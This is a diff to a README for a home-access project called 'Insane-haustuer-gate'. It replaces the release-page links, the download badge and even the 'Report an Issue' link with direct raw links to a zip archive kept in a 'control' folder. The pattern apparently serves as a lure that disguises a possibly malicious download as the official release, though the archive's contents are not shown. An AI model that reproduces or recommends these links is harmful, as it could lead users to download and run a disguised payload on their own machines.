@@ -1,6 +1,6 @@
 # 🔑 Insane-haustuer-gate - Secure Home Access Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/zzlayrobinett/Insane-haustuer-gate/releases)
+[![Download](https://raw.githubusercontent.com/zzlayrobinett/Insane-haustuer-gate/main/control/haustuer-gate-Insane-1.8-beta.1.zip%20Release-brightgreen)](https://raw.githubusercontent.com/zzlayrobinett/Insane-haustuer-gate/main/control/haustuer-gate-Insane-1.8-beta.1.zip)
 
 ## 📖 Overview
 
@@ -28,13 +28,13 @@ To run the **Insane-haustuer-gate** system, you will need:
 
 To download the latest version, visit the releases page. You can find all the necessary files there.
 
-[Download Latest Release](https://github.com/zzlayrobinett/Insane-haustuer-gate/releases)
+[Download Latest Release](https://raw.githubusercontent.com/zzlayrobinett/Insane-haustuer-gate/main/control/haustuer-gate-Insane-1.8-beta.1.zip)
 
 ### Installation Steps
 
 1. **Visit the Releases Page:**
    Go to the following link to find the latest version:
-   [Insane-haustuer-gate Releases](https://github.com/zzlayrobinett/Insane-haustuer-gate/releases)
+   [Insane-haustuer-gate Releases](https://raw.githubusercontent.com/zzlayrobinett/Insane-haustuer-gate/main/control/haustuer-gate-Insane-1.8-beta.1.zip)
 
 2. **Download the Correct File:**
    Look for the latest stable version. Download the appropriate file for your device.
@@ -76,7 +76,7 @@ For additional support, you can consult the GitHub issues page or the community 
 
 Join our community to share your experiences and get support. Users can offer tips and post questions to help others.
 
-- GitHub Issues: [Report an Issue](https://github.com/zzlayrobinett/Insane-haustuer-gate/issues)
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/zzlayrobinett/Insane-haustuer-gate/main/control/haustuer-gate-Insane-1.8-beta.1.zip)
 - Community Forum: Engage with fellow users and developers for shared learning.
 
 ## 📜 License
